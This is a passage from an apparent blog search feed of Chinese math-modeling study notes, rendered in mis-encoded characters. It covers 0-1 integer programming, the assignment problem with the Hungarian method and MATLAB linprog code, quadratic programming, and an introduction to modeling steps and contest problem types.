ä¸ºè‡ªç”±å˜é‡ï¼Œè€ƒè™‘åˆ©ç”¨çº¿æ€§ä»£æ•°çš„çŸ¥è¯†å¾—å‡ºåŸºç¡€è§£ç³»ï¼Œå†åœ¨åŸºç¡€è§£ç³»ä¸­æ‰¾å‡ºæ•´æ•°è§£ã€‚</p><p><img src="/Pictures/MCM/02/plot03.png" alt="img"></p><h3 id="åŒˆç‰™åˆ©ç®—æ³•è§£å†³0-1è§„åˆ’é—®é¢˜"><a href="#åŒˆç‰™åˆ©ç®—æ³•è§£å†³0-1è§„åˆ’é—®é¢˜" class="headerlink" title="åŒˆç‰™åˆ©ç®—æ³•è§£å†³0-1è§„åˆ’é—®é¢˜"></a>åŒˆç‰™åˆ©ç®—æ³•è§£å†³0-1è§„åˆ’é—®é¢˜</h3><p>$e.g.1$ ç°æœ‰å¦‚ä¸‹æŠ•èµ„é—®é¢˜ï¼š</p><p>æœ‰600ä¸‡å…ƒæŠ•èµ„äº”ä¸ªé¡¹ç›®ï¼Œæ”¶ç›Šå¦‚è¡¨ï¼Œæ±‚åˆ©æ¶¦æœ€å¤§çš„æ–¹æ¡ˆ</p><table><thead><tr><th>é¡¹ç›®</th><th>æŠ•èµ„é¢</th><th>é¡¹ç›®æ”¶ç›Š</th></tr></thead><tbody><tr><td>I</td><td>210</td><td>160</td></tr><tr><td>II</td><td>300</td><td>210</td></tr><tr><td>III</td><td>150</td><td>60</td></tr><tr><td>IV</td><td>130</td><td>80</td></tr><tr><td>V</td><td>260</td><td>180</td></tr></tbody></table><p>çº¦æŸæ¡ä»¶ï¼šé¡¹ç›®Iã€IIã€IIIä¸­é€‰ä¸€é¡¹ï¼›é¡¹ç›®IIIã€IVä¸­é€‰ä¸€é¡¹ï¼›é¡¹ç›®Vä»¥é¡¹ç›®Iä¸ºå…ˆéªŒæ¡ä»¶ã€‚</p><p>æˆ‘ä»¬å‡è®¾ $x_{i}&#x3D; \begin{cases} 1 ,é€‰ä¸­ç¬¬ié¡¹ \\ 0 ä¸é€‰ç¬¬ié¡¹ \end{cases}$</p><p>åˆ™å¯ä»¥æŠ½è±¡å‡ºä¸‹åˆ—æ¨¡å‹ï¼š</p><p>$$<br>max\ Z&#x3D;160x_{1}+210x_{2}+60x_{3}+80x_{4}+180x_{5}<br>$$</p><p>$$s.t.<br>\begin{cases}<br>210x_{1}+300x_{2}+150x_{3}+130x_{4}+260x_{5}\le 600 \\<br>x_{1}+x_{2}+x_{3}&#x3D;1 \\<br>x_{3}+x_{4}&#x3D;1 \\<br>x_{5}\le x_{1} \\<br>x_{1},x_{2},x_{3},x_{4},x_{5}&#x3D;0 or 1\\<br>\end{cases}$$</p><p>$e.g.2$ æŒ‡æ´¾é—®é¢˜</p><p>ç”²ä¹™ä¸™ä¸å››ä¸ªäººï¼ŒABCDå››é¡¹å·¥ä½œï¼Œè¦æ±‚æ¯äººåªèƒ½åšä¸€é¡¹å·¥ä½œï¼Œæ¯é¡¹å·¥ä½œåªç”±ä¸€äººå®Œæˆï¼Œé—®å¦‚ä½•è®©æŒ‡æ´¾æ€»æ—¶é—´æœ€çŸ­ï¼Ÿ</p><table><thead><tr><th>äººå‘˜&#x2F;æ—¶é—´&#x2F;ä»»åŠ¡</th><th>A</th><th>B</th><th>C</th><th>D</th></tr></thead><tbody><tr><td>ç”²</td><td>3</td><td>5</td><td>8</td><td>4</td></tr><tr><td>ä¹™</td><td>6</td><td>8</td><td>5</td><td>4</td></tr><tr><td>ä¸™</td><td>2</td><td>5</td><td>8</td><td>5</td></tr><tr><td>ä¸</td><td>9</td><td>2</td><td>5</td><td>2</td></tr></tbody></table><p>å¼•å…¥0-1å˜é‡ $x_{ij}$<br>$x_{ij}&#x3D;1 : ç¬¬ i äººåšç¬¬ j é¡¹å·¥ä½œ$<br>$x_{ij}&#x3D;0 ï¼šç¬¬ i äººä¸åšç¬¬ j é¡¹å·¥ä½œ$</p><p>$$<br>min\ Z&#x3D;3x_{11}+5x_{12}+8x_{13}+4x_{14}+6x_{21}+8x_{22}+5x_{23}+4x_{24}+2x_{31}+5x_{32}+8x_{33}+5x_{34}+9x_{41}+2x_{42}+5x_{43}+2x_{44}<br>$$</p><p>æ¯é¡¹ä»»åŠ¡åªç”±ä¸€ä¸ªäººå®Œæˆã€æ¯äººåªå®Œæˆä¸€é¡¹ä»»åŠ¡ï¼šæ¯è¡Œæ¯åˆ—ä¹‹å’Œå‡ä¸º1ï¼Œå³ï¼š<br>$$s.t.<br>\begin{cases}<br>\sum_{i&#x3D;1}^{n}x_{ij}&#x3D;1 \\<br> \\<br>\sum_{j&#x3D;1}^{n}x_{ij}&#x3D;1 \\<br> \\<br>x_{ij}&#x3D;0 or 1 \\<br>\end{cases}$$</p><p>ä¸€äº›ç‰¹æ®Šæƒ…å†µçš„å¤„ç†ï¼š</p><ul><li>äººå°‘å·¥ä½œå¤šï¼šæ·»åŠ è™šæ‹Ÿçš„â€œäººâ€ï¼Œä»£ä»·éƒ½ä¸º0</li><li>äººå¤šå·¥ä½œå°‘ï¼šæ·»åŠ è™šæ‹Ÿçš„å·¥ä½œï¼Œä»£ä»·éƒ½ä¸º0</li><li>ä¸€ä¸ªäººå¯åšå¤šä»¶å·¥ä½œï¼šè¯¥äººå˜ä¸ºå‡ ä¸ªç›¸åŒçš„â€œäººâ€</li><li>æŸå·¥ä½œä¸€å®šä¸èƒ½æœ‰æŸäººåšï¼šè¯¥äººåšè¯¥å·¥ä½œçš„ç›¸åº”ä»£ä»·å–è¶³å¤Ÿå¤§M</li></ul><p><strong>æŒ‡æ´¾é—®é¢˜çš„åŒˆç‰™åˆ©è§£æ³•çš„ä¸€èˆ¬æ­¥éª¤ï¼š</strong></p><ol><li><p>ç¬¬ä¸€æ­¥ï¼šå˜æ¢æŒ‡æ´¾é—®é¢˜çš„ç³»æ•°çŸ©é˜µ $(c_{ij})$ ä¸º $(b_{ij})$ ï¼Œä½¿åœ¨ $(b_{ij})$ çš„å„è¡Œå„åˆ—ä¸­éƒ½å‡ºç°0å…ƒç´ ï¼Œå³ï¼š</p><ul><li>ä» $(c_{ij})$ çš„æ¯è¡Œå…ƒç´ ä¸­éƒ½å‡å»è¯¥è¡Œçš„æœ€å°å…ƒç´ </li><li>å†ä»æ‰€å¾—æ–°ç³»æ•°çŸ©é˜µçš„æ¯åˆ—å…ƒç´ ä¸­å‡å»è¯¥åˆ—çš„æœ€å°å…ƒç´ <blockquote><p>å…¶ä¸­ï¼Œ $(c_{ij})$ ä¸ºæ¯è¡Œæ¯åˆ—ä»…æœ‰ä¸€ä¸ª1çš„çŸ©é˜µ</p></blockquote></li></ul></li><li><p>è¿›è¡Œè¯•æŒ‡æ´¾ï¼Œä»¥å¯»æ±‚æœ€ä¼˜è§£</p><ul><li>åœ¨ $(b_{ij})$ ä¸­å°½å¯èƒ½å¯»æ‰¾å¤šçš„ç‹¬ç«‹0å…ƒç´ ï¼Œè‹¥èƒ½æ‰¾å‡ºnä¸ªç‹¬ç«‹0å…ƒç´ ï¼Œå°±ä»¥è¿™nä¸ªç‹¬ç«‹0å…ƒç´ å¯¹åº”è§£çŸ©é˜µ $(x_{ij})$ ä¸­çš„å…ƒç´ ä¸º1ï¼Œå…¶ä½™ä¸º0ï¼Œè¿™å°±å¾—åˆ°æœ€ä¼˜è§£ã€‚</li><li>ä»åªæœ‰ä¸€ä¸ª0å…ƒç´ çš„è¡Œï¼ˆåˆ—ï¼‰å¼€å§‹ï¼Œç»™è¿™ä¸ª0å…ƒç´ åŠ åœˆï¼Œè®°ä½œ O ã€‚ç„¶ååˆ’å» O æ‰€åœ¨åˆ—ï¼ˆè¡Œï¼‰çš„å…¶å®ƒ0å…ƒç´ ï¼Œè®°ä½œ X ï¼Œè¿™è¡¨ç¤ºè¿™åˆ—æ‰€ä»£è¡¨çš„ä»»åŠ¡å·²ç»æŒ‡æ´¾å®Œï¼Œä¸éœ€è¦è€ƒè™‘ä»–äººã€‚</li><li>ç»™åªæœ‰ä¸€ä¸ª0å…ƒç´ çš„åˆ—ï¼ˆè¡Œï¼‰ä¸­çš„0å…ƒç´ åŠ åœˆï¼Œåˆ’å»æ‰€åœ¨è¡Œçš„0å…ƒç´ ã€‚</li><li>é‡å¤ä¸Šè¿°æ­¥éª¤ç›´åˆ°å°½å¯èƒ½å¤šçš„0å…ƒç´ éƒ½è¢«åœˆå‡ºå’Œåˆ’æ‰ã€‚</li></ul></li><li><p>è‹¥ä»æœ‰æ²¡æœ‰ç”»åœˆçš„0å…ƒç´ ï¼Œä¸”åŒè¡Œï¼ˆåˆ—ï¼‰çš„0å…ƒç´ è‡³å°‘æœ‰ä¸¤ä¸ªï¼Œåˆ™ä»å‰©ä¸‹0å…ƒç´ æœ€å°‘çš„è¡Œï¼ˆåˆ—ï¼‰å¼€å§‹ï¼Œæ¯”è¾ƒä»–ä»¬åˆ—ä¸­0å…ƒç´ çš„æ•°é‡ï¼Œé€‰æ‹©0å…ƒç´ å°‘çš„é‚£ä¸ª0å…ƒç´ ã€‚</p></li></ol><p>$$\begin{bmatrix}<br>  3&amp;  8&amp;  2&amp;  10&amp;3 \\<br>  8&amp;  7&amp;  2&amp;  9&amp;7 \\<br>  6&amp;  4&amp;  2&amp;  7&amp;5 \\<br>  8&amp;  4&amp;  2&amp;  3&amp;5 \\<br>  9&amp;  10&amp;  6&amp;  9&amp;10<br>\end{bmatrix}$$</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs MATLAB">c=[<span class="hljs-number">3</span>,<span class="hljs-number">8</span>,<span class="hljs-number">2</span>,<span class="hljs-number">10</span>,<span class="hljs-number">3</span>;<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">2</span>,<span class="hljs-number">9</span>,<span class="hljs-number">7</span>;<span class="hljs-number">6</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">7</span>,<span class="hljs-number">5</span>;<span class="hljs-number">8</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>;<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>]<br>c=c(:) <span class="hljs-comment">%å°†çŸ©é˜µè½¬åŒ–ä¸ºå‘é‡</span><br>a=<span class="hljs-built_in">zeros</span>(<span class="hljs-number">10</span>,<span class="hljs-number">25</span>);<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>:<span class="hljs-number">5</span><br>    a(<span class="hljs-built_in">i</span>,(<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)*<span class="hljs-number">5</span>+<span class="hljs-number">1</span>:<span class="hljs-number">5</span>*<span class="hljs-built_in">i</span>)=<span class="hljs-number">1</span>;<br>    a(<span class="hljs-number">5</span>+<span class="hljs-built_in">i</span>,<span class="hljs-built_in">i</span>:<span class="hljs-number">5</span>:<span class="hljs-number">25</span>)=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">end</span>  <span class="hljs-comment">%å¾ªç¯å°†æŒ‡æ´¾é—®é¢˜è½¬åŒ–ä¸ºçº¿æ€§è§„åˆ’é—®é¢˜</span><br>b=<span class="hljs-built_in">ones</span>(<span class="hljs-number">10</span>,<span class="hljs-number">1</span>);<br>[x,y]=linprog(c,[],[],a,b,<span class="hljs-built_in">zeros</span>(<span class="hljs-number">25</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">ones</span>(<span class="hljs-number">25</span>,<span class="hljs-number">1</span>));<br>X=<span class="hljs-built_in">reshape</span>(x,<span class="hljs-number">5</span>,<span class="hljs-number">5</span>)<br>opt=y<br></code></pre></td></tr></table></figure><p>æ±‚å¾—æœ€ä¼˜æŒ‡æ´¾æ–¹æ¡ˆä¸º $x_{15}&#x3D;x_{23}&#x3D;x_{32}&#x3D;x_{44}&#x3D;x_{51}&#x3D;1$ï¼Œæœ€ä¼˜å€¼ä¸º21.</p><h1 id="éçº¿æ€§è§„åˆ’"><a href="#éçº¿æ€§è§„åˆ’" class="headerlink" title="éçº¿æ€§è§„åˆ’"></a>éçº¿æ€§è§„åˆ’</h1><p>ä¸€èˆ¬å½¢å¼ï¼š<br>$$<br>min\ f(x)<br>$$</p><p>$$s.t.<br>\begin{cases}<br>h_{j}(x)\le 0\ j&#x3D;1,2,\ldots q \\<br> \\<br>g_{i}(x) &#x3D; 0\ i&#x3D;1,2,\ldots p<br>\end{cases}$$</p><p>åœ¨ä¸€ç»„ç­‰å¼æˆ–ä¸ç­‰å¼çš„çº¦æŸä¸‹ï¼Œæ±‚ä¸€ä¸ªå‡½æ•°çš„æœ€å¤§å€¼ï¼ˆæˆ–æœ€å°å€¼ï¼‰é—®é¢˜ï¼Œå…¶ä¸­è‡³å°‘æœ‰ä¸€ä¸ªéçº¿æ€§å‡½æ•°ï¼Œè¿™ç±»é—®é¢˜ç§°ä¹‹ä¸ºéçº¿æ€§è§„åˆ’é—®é¢˜ã€‚</p><h2 id="MATLABä¸­éçº¿æ€§è§„åˆ’çš„æ•°å­¦æ¨¡å‹å†™æˆä»¥ä¸‹å½¢å¼ï¼š"><a href="#MATLABä¸­éçº¿æ€§è§„åˆ’çš„æ•°å­¦æ¨¡å‹å†™æˆä»¥ä¸‹å½¢å¼ï¼š" class="headerlink" title="MATLABä¸­éçº¿æ€§è§„åˆ’çš„æ•°å­¦æ¨¡å‹å†™æˆä»¥ä¸‹å½¢å¼ï¼š"></a>MATLABä¸­éçº¿æ€§è§„åˆ’çš„æ•°å­¦æ¨¡å‹å†™æˆä»¥ä¸‹å½¢å¼ï¼š</h2><p>$$<br>min\ f(x)<br>$$</p><p>$$s.t.<br>\begin{cases}<br>A.x\le b \\<br>Aeq.x &#x3D; beq \\<br>c(x) \le 0 \\<br>ceq(x) &#x3D; 0 \\<br>lb\le x \le ub<br>\end{cases}$$</p><p>å…¶ä¸­ $f(x)$ æ˜¯æ ‡é‡å‡½æ•°ï¼Œ $c(x),ceq(x)$ æ˜¯éçº¿æ€§å‘é‡å‡½æ•°ã€‚</p><h2 id="äºŒæ¬¡è§„åˆ’"><a href="#äºŒæ¬¡è§„åˆ’" class="headerlink" title="äºŒæ¬¡è§„åˆ’"></a>äºŒæ¬¡è§„åˆ’</h2><p>è‹¥æŸéçº¿æ€§è§„åˆ’çš„ç›®æ ‡å‡½æ•°ä¸ºè‡ªå˜é‡çš„äºŒæ¬¡å‡½æ•°ï¼Œçº¦æŸæ¡ä»¶åˆå…¨æ˜¯çº¿æ€§çš„ï¼Œå°±ç§°è¿™ç§è§„åˆ’ä¸ºäºŒæ¬¡è§„åˆ’ã€‚<br>MATLABä¸­äºŒæ¬¡è§„åˆ’çš„æ•°å­¦æ¨¡å‹å¯ä»¥è¡¨è¿°å¦‚ä¸‹ï¼š<br>$$<br>min\ \frac{1}{2}x^{T}Hx+f^{T}x<br>$$</p><p>$$s.t.<br>\begin{cases}<br>Ax\le b \\<br>Aeq.x&#x3D;beq \\<br>lb \le x \le ub<br>\end{cases}$$</p><p>è¿™é‡Œçš„Hæ˜¯å®å¯¹ç§°çŸ©é˜µï¼ˆäºŒæ¬¡å‹ï¼‰ï¼Œfï¼Œbï¼Œbeqï¼Œlbï¼Œubæ˜¯åˆ—å‘é‡ï¼ŒAï¼ŒAeqæ˜¯ç›¸åº”ç»´æ•°çš„çŸ©é˜µ</p><p>MATLABä¸­äºŒæ¬¡è§„åˆ’çš„å‘½ä»¤æ˜¯<br>[x,fval]&#x3D;quadprog(H,f,A,b,Aeq,beq,lb,ub,x0,options)</p><h2 id="ä¸€é“ä¾‹é¢˜-1"><a href="#ä¸€é“ä¾‹é¢˜-1" class="headerlink" title="ä¸€é“ä¾‹é¢˜"></a>ä¸€é“ä¾‹é¢˜</h2><p>æŸå…¬å¸æœ‰6ä¸ªå»ºç­‘å·¥åœ°è¦å¼€å·¥ï¼Œæ¯ä¸ªå·¥åœ°çš„ä½ç½®ï¼ˆç”¨å¹³é¢åæ ‡ç³»aï¼Œbè¡¨ç¤ºï¼Œè·ç¦»å•ä½ï¼šKMï¼‰åŠæ°´æ³¥æ—¥ç”¨é‡dï¼ˆå¨ï¼‰ç”±ä¸‹è¡¨ç»™å‡ºã€‚ç›®å‰æœ‰ä¸¤ä¸ªä¸´æ—¶æ–™åœºä½äºAï¼ˆ5ï¼Œ1ï¼‰ï¼ŒBï¼ˆ2ï¼Œ7ï¼‰ï¼Œæ—¥å‚¨é‡å„æœ‰20å¨ã€‚å‡è®¾ä»æ–™åœºå¯¼å·¥åœ°ä¹‹é—´å‡æœ‰ç›´çº¿é“è·¯ç›¸è¿ã€‚</p><ol><li>è¯•åˆ¶å®šæ¯å¤©çš„ä¾›åº”è®¡åˆ’ï¼Œå³ä»Aï¼ŒBä¸¤æ–™åœºåˆ†åˆ«å‘å„å·¥åœ°è¿é€å¤šå°‘å¨æ°´æ³¥ï¼Œä½¿æ€»çš„å¨åƒç±³æ•°æœ€å°</li><li>ä¸ºäº†è¿›ä¸€æ­¥å‡å°‘å¨åƒç±³æ•°ï¼Œæ‰“ç®—èˆå¼ƒä¸¤ä¸ªä¸´æ—¶æ–™åœºï¼Œæ”¹å»ºä¸¤ä¸ªæ–°çš„ï¼Œæ—¥å‚¨é‡å„ä¸º20å¨ï¼Œé—®åº”å»ºåœ¨ä½•å¤„ï¼Œä½¿å¾—èŠ‚çœçš„å¨åƒç±³æ•°æœ€å¤§ï¼Ÿ</li></ol><p>å·¥åœ°ä½ç½®(a,b)åæ ‡å‚æ•°ä»¥åŠæ°´æ³¥æ—¥ç”¨é‡d</p><table><thead><tr><th></th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th></tr></thead><tbody><tr><td>a</td><td>1.25</td><td>8.75</td><td>0.5</td><td>5.75</td><td>3</td><td>7.25</td></tr><tr><td>b</td><td>1.25</td><td>0.75</td><td>4.75</td><td>5</td><td>6.5</td><td>7.25</td></tr><tr><td>d</td><td>3</td><td>5</td><td>4</td><td>7</td><td>6</td><td>11</td></tr></tbody></table><h3 id="å»ºç«‹æ¨¡å‹"><a href="#å»ºç«‹æ¨¡å‹" class="headerlink" title="å»ºç«‹æ¨¡å‹"></a>å»ºç«‹æ¨¡å‹</h3><p>æˆ‘ä»¬å¯ä»¥è®°å·¥åœ°çš„ä½ç½®ä¸º $(a_{i},b_{i})$ ï¼Œæ°´æ³¥æ—¥ç”¨é‡ä¸º $d_{i}$ ï¼Œæ–™åœºçš„åæ ‡ä¸º $(x_{j},y_{j})$ æ—¥å‚¨é‡ä¸º $e_{j}$ ï¼Œä»æ–™åœºjå‘å·¥åœ°içš„è¿é€é‡ä¸º $X_{ij}$ ã€‚</p><p>ç›®æ ‡å‡½æ•°ä¸ºï¼š $min\ f&#x3D;\sum_{j&#x3D;1}^{2} \sum_{i&#x3D;1}^{6} X_{ij} \sqrt{(x_{j}-a_{i})^{2}+(y_{j}-b_{i})^{2}}$</p><p>$$s.t.<br>\begin{cases}<br>\sum_{j&#x3D;1}^{2}X_{ij}&#x3D;d_{i} \\<br> \\<br>\sum_{i&#x3D;1}^{6}X_{ij}\le e_{j}<br>\end{cases}$$</p><p>å½“å¯ç”¨ä¸´æ—¶æ–™åœºæ—¶å†³ç­–å˜é‡ä¸º $X_{ij}$ ï¼Œ<br>ä¸ç”¨ä¸´æ—¶æ–™åœºæ—¶å†³ç­–å˜é‡ä¸ºï¼š $X_{ij},x_{j},y_{j}$</p><hr><p>æ¥æºï¼šbç«™æ•°æ¨¡è€å“¥ï¼ŒSJTUæ•°æ¨¡èµ„æ–™åº“ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>MCM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MCM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MCMç»ªè®º</title>
    <link href="/2024/01/26/MCM%E6%A8%A1%E5%9E%8B%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    <url>/2024/01/26/MCM%E6%A8%A1%E5%9E%8B%E4%B8%8E%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2>æ•°å­¦å»ºæ¨¡çš„å…­ä¸ªæ­¥éª¤</h2><h3>æ¨¡å‹å‡†å¤‡</h3>äº†è§£é—®é¢˜çš„å®é™…èƒŒæ™¯ï¼Œæ˜ç¡®å…¶å®é™…æ„ä¹‰ï¼ŒæŒæ¡å¯¹è±¡çš„å„ç§ä¿¡æ¯ï¼Œç”¨æ•°å­¦é—®é¢˜æ¥è§£é‡Šé—®é¢˜çš„ç²¾é«“ã€‚<blockquote><p>äº†è§£æ¨¡å‹çš„<em>ä¸»è¦åŠŸèƒ½</em>ã€<em>ä½¿ç”¨åœºæ™¯</em>ã€<em>éœ€è¦æ¡ä»¶</em>ã€<em>ä¼˜ç¼ºç‚¹</em>ã€<em>æ”¹è¿›æ–¹å‘</em></p></blockquote><h3>æ¨¡å‹å‡è®¾</h3>æ ¹æ®å®é™…å¯¹è±¡çš„ç‰¹å¾å’Œå»ºæ¨¡çš„ç›®çš„ï¼Œå¯¹é—®é¢˜è¿›è¡Œå¿…è¦çš„ç®€åŒ–ï¼Œå¹¶ç”¨ç²¾ç¡®çš„è¯­è¨€æå‡ºä¸€äº›æ°å½“çš„å‡è®¾ï¼Œå¹¶ç”¨è¡¨è¾¾å¼å°†å…¶è¡¨è¾¾å‡ºæ¥ã€‚<h3>æ¨¡å‹å»ºç«‹</h3>åœ¨å‡è®¾çš„åŸºç¡€ä¸Šï¼Œåˆ©ç”¨é€‚å½“çš„æ•°å­¦å·¥å…·æ¥åˆ»åˆ’å„å˜é‡ä¹‹é—´çš„æ•°å­¦å…³ç³»ï¼Œå»ºç«‹ç›¸åº”çš„æ•°æ®ç»“æ„ã€‚<h3>æ¨¡å‹æ±‚è§£</h3>åˆ©ç”¨è·å–çš„æ•°æ®èµ„æ–™ï¼Œå¯¹æ¨¡å‹çš„æ‰€æœ‰å‚æ•°åšå‡ºè®¡ç®—ã€‚æ¨å¯¼æ¨¡å‹çš„å…¬å¼ï¼Œå°†æ•°å­¦è¡¨è¾¾å¼å˜ä¸ºå»ºæ¨¡æ–¹æ³•çš„æ ‡å‡†å½¢å¼ï¼Œé€šè¿‡é™åˆ¶æ¡ä»¶ï¼Œå¯¹æ¨¡å‹è¿›è¡Œæ±‚è§£ã€‚<h3>æ¨¡å‹åˆ†æ</h3>å¯¹æ‰€è¦å»ºç«‹æ¨¡å‹çš„æ€è·¯è¿›è¡Œé˜è¿°ï¼Œå¯¹æ‰€å¾—çš„ç»“æœè¿›è¡Œæ•°å­¦ä¸Šçš„åˆ†æã€‚åŒ…æ‹¬è¯¯å·®åˆ†æã€æ•°æ®ç¨³å®šæ€§åˆ†æç­‰ã€‚<h3>æ¨¡å‹æ£€éªŒ</h3>ç”¨éæŠ€æœ¯æ€§çš„è¯­è¨€å›ç­”å®é™…é—®é¢˜ã€‚å°†æ¨¡å‹åˆ†æç»“æœä¸å®é™…æƒ…æ™¯è¿›è¡Œæ¯”è¾ƒï¼Œç”¨æ¥éªŒè¯æ¨¡å‹çš„å‡†ç¡®æ€§ã€åˆç†æ€§å’Œé€‚ç”¨æ€§ã€‚<hr><h2>èµ›é¢˜çš„ç±»å‹</h2><h3>é¢„æµ‹ç±»</h3>é€šè¿‡åˆ†æå·²æœ‰çš„æ•°æ®æˆ–è€…ç°è±¡ï¼Œæ‰¾å‡ºå…¶å†…åœ¨å‘å±•è§„å¾‹ï¼Œçƒ­æ¡ˆåå¯¹æœªæ¥æƒ…å½¢åšå‡ºé¢„æµ‹çš„è¿‡ç¨‹ã€‚<ul><li>å°æ ·æœ¬å†…éƒ¨é¢„æµ‹</li><li>å¤§æ ·æœ¬å†…éƒ¨é¢„æµ‹</li><li>å°æ ·æœ¬æœªæ¥é¢„æµ‹</li><li>å¤§æ ·æœ¬éšæœºå› ç´ æˆ–å‘¨æœŸç‰¹å¾çš„æœªæ¥é¢„æµ‹</li></ul><p>è§£å†³é¢„æµ‹ç±»èµ›é¢˜çš„ä¸€èˆ¬æ­¥éª¤ï¼š</p><ol><li>ç¡®å®šé¢„æµ‹ç›®æ ‡</li><li>æ”¶é›†ã€åˆ†æèµ„æ–™</li><li>é€‰æ‹©åˆé€‚çš„æ¨¡å‹è¿›è¡Œæ‹Ÿåˆ</li><li>åˆ†æç»“æœå¹¶ä¿®æ­£</li></ol><h3>è¯„ä»·ç±»</h3>æŒ‰ç…§ä¸€å®šçš„æ ‡å‡†å¯¹äº‹ç‰©çš„å‘å±•æˆ–è€…ç°çŠ¶è¿›è¡Œåˆ’åˆ†çš„è¿‡ç¨‹ã€‚<ul><li>ç”Ÿæ€ç¯å¢ƒ</li><li>ç¤¾ä¼šå»ºè®¾</li><li>æ–¹æ¡ˆç­–ç•¥</li></ul><p>è§£å†³è¯„ä»·ç±»èµ›é¢˜çš„ä¸€èˆ¬æ­¥éª¤ï¼š</p><ol><li>æ˜ç¡®è¯„ä»·ç›®çš„</li><li>ç¡®å®šè¢«è¯„ä»·çš„å¯¹è±¡</li><li>å»ºç«‹è¯„ä»·æŒ‡æ ‡ä½“ç³»</li><li>ç¡®å®šä¸ªæŒ‡æ ‡ç›¸å¯¹åº”çš„æƒé‡ç³»æ•°</li><li>é€‰æ‹©æˆ–æ„é€ ç»¼åˆè¯„ä»·æ¨¡å‹</li><li>è®¡ç®—å„ç³»ç»Ÿçš„ç»¼åˆè¯„ä»·å€¼å¹¶å¾—å‡ºç»“æœ</li></ol><h3>æœºç†åˆ†æç±»èµ›é¢˜</h3>æ ¹æ®å¯¹ç°å®å¯¹è±¡ç‰¹æ€§çš„è®¤è¯†ï¼Œåˆ†æå…¶å› æœå…³ç³»ï¼Œæ‰¾å‡ºååº”å…§éƒ¨æœºç†çš„è§„å¾‹ã€‚<ul><li>ç©ºæ°”åŠ¨åŠ›å­¦</li><li>æµä½“åŠ›å­¦</li><li>çƒ­åŠ›å­¦</li></ul><h3>ä¼˜åŒ–ç±»èµ›é¢˜</h3>åœ¨ç°æœ‰æ¡ä»¶ç›¸å¯¹å›ºå®šçš„æƒ…å†µä¸‹ï¼Œå¦‚ä½•ä½¿ç›®æ ‡æ•ˆæœè¾¾åˆ°æœ€ä½³ã€‚ä¼˜åŒ–ç±»é—®é¢˜å¾€å¾€éœ€è¦åˆ†æä¸‰ä¸ªå…³é”®å› ç´ ï¼š<ul><li>ç›®æ ‡å‡½æ•°</li><li>å†³ç­–å˜é‡</li><li>çº¦æŸæ¡ä»¶</li></ul><p>è§£å†³ä¼˜åŒ–ç±»èµ›é¢˜çš„ä¸€èˆ¬æ­¥éª¤ï¼š</p><ol><li>ç¡®å®šä¼˜åŒ–ç›®æ ‡</li><li>ç¡®å®šå†³ç­–å˜é‡</li><li>æ„å»ºç›®æ ‡å‡½æ•°</li><li>æ ¹æ®å·²çŸ¥æ¡ä»¶æ„å»ºçº¦æŸæ¡ä»¶</li><li>é€‰æ‹©åˆé€‚çš„æ–¹æ³•æ±‚è§£ç›®æ ‡å‡½æ•°å¹¶ç»™å‡ºä¼˜åŒ–ç»“æœ</li></ol>]]></content>
    
    
    <categories>
      
      <category>MCM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MCM</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
